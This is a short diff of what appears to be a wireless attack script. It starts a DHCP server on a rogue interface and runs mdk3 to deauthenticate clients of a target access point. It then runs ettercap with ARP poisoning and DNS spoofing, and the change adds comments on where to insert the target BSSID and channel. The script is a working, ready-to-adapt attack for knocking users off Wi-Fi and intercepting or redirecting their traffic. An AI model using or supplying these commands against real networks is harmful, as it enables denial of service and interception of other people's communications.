@@ -43,7 +43,7 @@ dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
 
 #/usr/sbin/dnsspoof -f /etc/dnsspoof.conf
 
-echo "C8:CB:B8:E7:68:12" > blacklist
-gnome-terminal -x mdk3 wlan0mon d -b blacklist -c 9
+echo "C8:CB:B8:E7:68:12" > blacklist #replace "C8:CB:B8:E7:68:12" by the target BSSID here
+gnome-terminal -x mdk3 wlan0mon d -b blacklist -c 9 #replace 9 with the AP channel here
 gnome-terminal -x ettercap -i at0 -T -q -P dns_spoof -M ARP:remote
 
